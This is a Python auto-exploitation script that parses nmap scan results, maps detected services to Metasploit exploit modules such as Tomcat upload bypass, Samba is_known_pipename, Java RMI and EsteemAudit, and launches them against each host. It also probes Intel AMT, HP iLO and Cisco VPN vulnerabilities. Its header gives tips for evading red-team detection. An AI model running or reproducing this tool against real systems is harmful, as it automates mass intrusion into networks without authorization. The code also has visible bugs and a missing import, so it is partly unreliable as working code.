'''Coded by devcoinfet this is a  very dangerous Program and is not to be used for that only run this if you are allowed
meant for RedTeaming and Sec Bods not Skids
I coded this to autopwn CTF Challenges and real World Pentests please do not abuse this

General Red Team Tips
Below are a few general tips for avoiding detection during red team engagements.
https://blog.netspi.com/common-red-team-techniques-vs-blue-team-controls-infographic/
Do not perform large scanning operations. - check already scanned and this just consumes that data completely passive until atttack phase
Do not perform online dictionary attacks. - check no bruting done here
Do perform recon locally and on the network. - check hence my tool consuming Your xml from nmap via command line as param 
Do perform targeted attacks based on recon data. - check hence the name surgeon
Do not use common attack tools. Especially on disk. -- super check I obviously wrote most of this logic
Do try to stay off disk when possible. -- perfect for us attacks are metrepreter based payloads from metasploit framework via msfrpc most of the time
Do try to operate as a normal user or application. -- check again no data is sent so it only acts on open ports and agressive banner detection

'''
#todo add session tracking to dump to list of how many sessions we have
import uuid
import os
import sys
import re
import time
from libnmap.process import NmapProcess
from libnmap.parser import NmapParser, NmapParserException
from libnmap.objects.os import NmapOSFingerprint
import string
from collections import OrderedDict
from subprocess import PIPE, Popen
from BoneSaw import *
from Scalpel import *
from colorama import init
from colorama import Fore, Back, Style

init()
schannel_tls_hosts = []
detected_exploits = []
all_modules = []
modules_by_os = []
Host_Data = []
amt_hosts = []
cisco_vpn_sploitz  = []
detected_routers = []
Hp_Ilos = []
sploitsforos = []
exploits_local = []
target_list = []



def parse_headers(server_header,url):
      #small mod to function to allow header type to be passed in for Rancher Apache etc
      r = requests.head(url,allow_redirects=False, timeout=1)
      server = r.headers['server']
      print(Style.DIM + r.headers)
      if server_header in server:
         return server
      else:
         pass


def screaming_banshee(ip):
    res, data = test(ip)
    if res:
       print(Fore.GREEN + '[+] Target is VULNERABLE!')
       for i in data['Items']:
           print(Fore.GREEN + str('[+] Account name: %s Username: %s' % (i['Name'], i['Oem']['Hp']['LoginName'])))
       return "VULNERABLE"
    else:
        return False

	
def report_parser2(report):
    ''' Parse the Nmap XML report '''
    for host in report.hosts:
        ip = host.address

        if host.is_up():
           hostname = 'N/A'
           if len(host.hostnames) != 0:
              hostname = host.hostnames[0]
              #print(Style.DIM +  '[*] {0} - {1}'.format(ip, hostname))

            
        for s in host.services:
            if s.open():
               serv = s.service
               port = s.port
               ban = s.banner
               if 'os' in host._extras:
                   #determine if os is present
                   os = NmapOSFingerprint(host._extras['os'])
                   operating_system = os

                   if not 'os' in host._extras:
                            os = NmapOSFingerprint(host._extras['os'])
                            operating_system = {}
                            
                   handle_data(ip, port,ban, os)

                   
def remove_duplicates(values):
    output = []
    seen = set()
    for value in values:
        # If value has not been encountered yet,
        # ... add it to both list and set.
        if value not in seen:
            output.append(value)
            seen.add(value)
    return output




def handle_data(ip, port, ban, os):
    ''' Do something with the nmap data '''
    if ban != '':
       ban = ' -- {0}'.format(ban)
       rmv_str = "-- product:"
       clean_banner = remove_all(rmv_str,format(ban))
       output_banners = []
       output_banners.append(ban)
       scan_data = {'Host':ip,'Port':port,'Banner':clean_banner,'operating_system':os}
       Host_Data.append(scan_data)
       banner_results = remove_duplicates(output_banners)
       for outputs in banner_results:
           #write all banners clean to file so we can view them as we go and mod tool and sploitz to be more precise
           with open("banners.txt", "a") as myfile:
                myfile.write(str(ip)+":"+":"+str(port)+":"+str(outputs))
                myfile.write("\n")
       
       

def load_modules():
    with open("modules.txt", "rb") as infile:
         for lines in infile:
             all_modules.append(lines)



def sort_modules_os(os_banner):
    local_modules = []
    for exploit in all_modules:
        if os_banner in exploit:
           local_modules.append(exploit)
    return local_modules
  
    
def sort_modules(banner,os_banners):
    local_modules = []
    for exploit in os_banners:
        if banner in exploit:
           local_modules.append(exploit)
    return local_modules


def sneaky_begger(host,port):
    if exploit_web_interface(host, port) or exploit_wsman(host, port):
        print('\033[31m' + "[success] CVE-2017-5689" + host, port)
        #pop this to global list of amt vuln hosts
    else:
        print('\033[31m' +"[failed]  CVE-2017-5689 - " + host,port)




def metasploit_lookup(os,dork,hosts):
    detected_exploitz = []
    os_banners = sort_modules_os(os)
    print('\033[31m'  + os +":Detected Loading Correct Exploits")
    sorted_soft_banners = sort_modules(dork,os_banners)
    for exploit in sorted_soft_banners:
        possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit.lower().replace(" ", "").rstrip()}
        detected_exploits.append(possible_exploit_data)
    
        
def the_outer_limits(hosts):
    
    ostype = str(hosts['operating_system'])

    if "Intel Active Management Technology User Notification Service httpd" in hosts['Banner'] or "Intel Small Business Technology (SBT)" in hosts['Banner'] or "Intel Standard Manageability (ISM)" in hosts['Banner']:
        data = {'Host':hosts['Host'],'Port':hosts['Port']}
        amt_hosts.append(data)
        

    if  'Terminal Service' in hosts['Banner']:
            exploit = "exploit/windows/rdp/esteem_audit_port"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)
            
    if "linux" in ostype.lower() or "virtualbox" in ostype.lower():
        
                    
        if "Tomcat"  in hosts['Banner']:
            exploit = "exploit/multi/http/tomcat_jsp_upload_bypass"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)

        if "ProFTPD" in hosts['Banner'] :
            metasploit_lookup('linux','proftp',hosts)
            metasploit_lookup('unix','proftp',hosts)
         
            
        if "plex" in hosts['Banner'].lower():
            metasploit_lookup('linux','mycloud',hosts)
            
                
        if "Docker Registry" in hosts['Banner'] :
            metasploit_lookup('linux','docker',hosts)
                    

        if "Node.js Express framework" in  hosts['Banner']:
            exploit = "exploit/multi/misc/nodejs_v8_debugger"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)
                
                
        if "elastic" in hosts['Banner'].lower():
            metasploit_lookup('linux','elastic',hosts)
                   
       
        if "D-Link" in hosts['Banner']:
            metasploit_lookup('linux','dlink',hosts)
            string_router = hosts['Host'] +':' + str(hosts['Port'])
            if string_router not in detected_routers:
               detected_routers.append(string_router)
                    


        if "linksys" in hosts['Banner'].lower():
            metasploit_lookup('linux','linksys',hosts)
            string_router = hosts['Host'] +':' + str(hosts['Port'])
            if string_router not in detected_routers:
               detected_routers.append(string_router)
                    

                    
        if "netgear" in hosts['Banner'].lower():
            metasploit_lookup('linux','netgear',hosts)
            string_router = hosts['Host'] +':' + str(hosts['Port'])
            if string_router not in detected_routers:
               detected_routers.append(string_router)
                    

        if "Samba smbd" in hosts['Banner']:
           exploit = "exploit/linux/samba/is_known_pipename"
           possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
           detected_exploits.append(possible_exploit_data)


        if "Postfix smtpd" in hosts['Banner']:
           metasploit_lookup('linux','postfix',hosts)

   
           
        if "Hikvision DVR" in hosts['Banner']:
            metasploit_lookup('linux','hikvision',hosts)
            string_router = hosts['Host'] + ':' + str(hosts['Port'])
            if string_router not in detected_routers:
               detected_routers.append(string_router)
                    
            

        if "vnc" in hosts['Banner'].lower():
            metasploit_lookup('auxiliary','vnc',hosts)
                    

        if "PostgreSQL DB" in hosts['Banner']:
            metasploit_lookup('linux','postgre',hosts)
                    
        if "vsftpd" in hosts['Banner']:
            metasploit_lookup('unix','vsftp',hosts)
                     

        if "Tomcat"  in hosts['Banner']:
            exploit = "exploit/multi/http/tomcat_jsp_upload_bypass"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)
             

        if "Java RMI"  in hosts['Banner']:
            exploit = "exploit/multi/misc/java_rmi_server"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)


        if "unreal" in hosts['Banner'].lower():
            metasploit_lookup('unix','unreal',hosts)


        if "MySQL" in hosts['Banner']:
            metasploit_lookup('linux','mysql',hosts)

        
    if "Tomato" in ostype:
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)

                 
    if "unix" in ostype:
       print("unix")
       
                 
    
        
    if "Windows" in ostype or "virtualbox" in ostype.lower():
        print("windows")
		
        if 'iis' in hosts['Banner'].lower().rstrip():
            metasploit_lookup('windows','iis',hosts)
                    
                    
        if 'Microsoft SQL Server' in hosts['Banner']:
            metasploit_lookup('windows','mssql',hosts)
                    
        if "netbios-ssn" in  hosts['Banner'] or "microsoft-ds" in hosts['Banner']:
            metasploit_lookup('windows','smb',hosts)

        if  'Terminal Service' in hosts['Banner']:
            exploit = "exploit/windows/rdp/esteem_audit_port"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)
        # done twice because some firewalls stand in to protect

        
        if "Microsoft SChannel TLS" in hosts['Banner']:
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':"Possible WInshock Host"}
            schannel_tls_hosts.append(possible_exploit_data)


        if 'vnc' in hosts['Banner'].lower():
            metasploit_lookup('windows','vnc',hosts)

                    
        if "Tomcat"  in hosts['Banner']:
            exploit = "exploit/multi/http/tomcat_jsp_upload_bypass"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)
             

        if "Java RMI"  in hosts['Banner']:
            exploit = "exploit/multi/misc/java_rmi_server"
            possible_exploit_data = {'Host':hosts['Host'],'Port':hosts['Port'],'Exploit':exploit}
            detected_exploits.append(possible_exploit_data)

                
        if "mysql"  in hosts['Banner'].lower():

            metasploit_lookup('windows','mysql',hosts)
                    
    if "BSD" in ostype:
       print("BSD Detected")
        
                 
        
                 
    if "iLO" in ostype:
        if "HP Integrated Lights-Out" in hosts['Banner']:
            resp = screaming_banshee(hosts['Host'])
            if resp == "Vulnerable":
               if hosts['Host'] not in Hp_Ilos:
                  Hp_Ilos.append(hosts['Host'])
            else:
                pass
               
              

    if "OpenBSD" in ostype:
       print("Open BSD Detected")
        
                
                
    if "OpenWRT" in ostype:
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)

               

    if "MikroTik RouterOS" in ostype :
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)
        

        
    if "DD-WRT" in ostype:
        metasploit_lookup('linux','ddwrt',hosts)
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)
            

    if "Arris" in hosts['Banner']:
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)
            
                
    if "ios" in ostype:
        exploits = metasploit_lookup('auxiliary/admin','cisco',hosts)
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in detected_routers:
           detected_routers.append(string_router)

 
            
    if "Netscreen ScreenOS telnetd" in hosts['Banner']:
        print("Netscreen Os")

            
    if "Cisco VPN" in ostype or "VPN Concentrator" in ostype:
        metasploit_lookup('cisco','cisco',hosts)
        string_router = str(hosts['Host']) + str(':') + str(hosts['Port'])
        if string_router not in cisco_vpn_sploitz:
           cisco_vpn_sploitz.append(string_router)
        if string_router not in detected_routers:
           detected_routers.append(string_router)

    #pull it off 1 by 1 on each system
    
    exploiter(detected_exploits)


def exploiter(sploits_in):
     print len(sploits_in)
     for exploits_to_run in sploits_in:
         session = str(uuid.uuid4())
         RHOST = exploits_to_run['Host']
         RPORT = exploits_to_run['Port']
         print RHOST
         print RPORT
         #LPORT = getfreeport()
         LHOST = "127.0.0.1"
         exploit = exploits_to_run['Exploit']
         print exploit.rstrip() +"\n"
         metasploit_fun(RPORT,RHOST,exploit)

     
def display_data():
    print('\033[31m' + "Th3 Surg30n Has Identified"+"\n")
    print('\033[31m' + str(len(detected_exploits))+"\n")
    print('\033[31m' + "Exploits"+"\n")
    for hosts in Host_Data:
        target_list.append(hosts['Host'])
    print('\033[31m'+ '-'*15)   
    print('\033[31m' + "Against " + str(len(target_list))+"Systems"+"\n")
    for possible_sploitz in detected_exploits:
        print('\033[31m' + str(possible_sploitz))

    print('\033[31m' + "\n")
    print('\033[31m' + "-" * 25+"\n")
    print('\033[31m' + str(len(detected_routers))+"\n")
    print('\033[31m' + "Possible Routers & Or Cameras Passing off to Rotuer Exploitation Framework"+"\n")
    print('\033[31m' + "-" * 25+"\n")
    for possible_routerz in detected_routers:
        print('\033[31m' + possible_routerz)


    test_winshock()
    test_amt()
    test_cisco()


def remove_all(substr, str):
    index = 0
    length = len(substr)
    while string.find(str, substr) != -1:
          index = string.find(str, substr)
          str = str[0:index] + str[index+length:]
    return str

def test_winshock():
    print('\033[31m'+ "\n")
    print('\033[31m' + "-" * 25+"\n")
    print('\033[31m' + str(len(schannel_tls_hosts))+"\n")
    print('\033[31m' + "Possibe Hosts Vulnerable To Winshock (MS14-066)"+"\n")
    print('\033[31m' + "-" * 25+"\n")
    for possible_winShokz in schannel_tls_hosts:
        print('\033[31m' + possible_winShokz['Host']+"\n")

def test_amt():
    print('\033[31m' + "\n")
    print('\033[31m' + "-" * 25+"\n")
    print('\033[31m' + str(len(amt_hosts))+"\n")
    print('\033[31m' + "Possibe Hosts Vulnerable To CVE-2017-5689"+"\n")
    print('\033[31m' + "-" * 25+"\n")
    for possible_amt_bypass in amt_hosts:
        
        print('\033[31m' + "--" * 10+"\n")
        print('\033[31m' + possible_amt_bypass['Host'])
        print('\033[31m' + possible_amt_bypass['Port'])
        print('\033[31m' + "--" * 10+"\n")

    for amts in amt_hosts:
        try:
           sneaky_begger(amts['Host'],amts['Port'])
        except:
            pass
   
def test_cisco():
    for value_sploitz in cisco_vpn_sploitz:
        print('\033[31m' + "-" * 25+"\n")
        print(value_sploitz+"\n")
        print("Testing For Ike 1 Vpn Exploit Via Cisco Vpn\n")
        try :
            ret_code = is_vulnable(value_sploitz['Host'], value_sploitz['Port'])
            if ret_code == True:
               print("Potentially Vulnerable Cisco Router Vulnearble To CVE-2016-6415 \n")
        except:
              pass
    print('\033[30m')

def main():
    load_modules()
    report = NmapParser.parse_fromfile(sys.argv[1])
    report_parser2(report)
    for hosts in Host_Data:
        the_outer_limits(hosts)
    
    
    display_data() 
main()
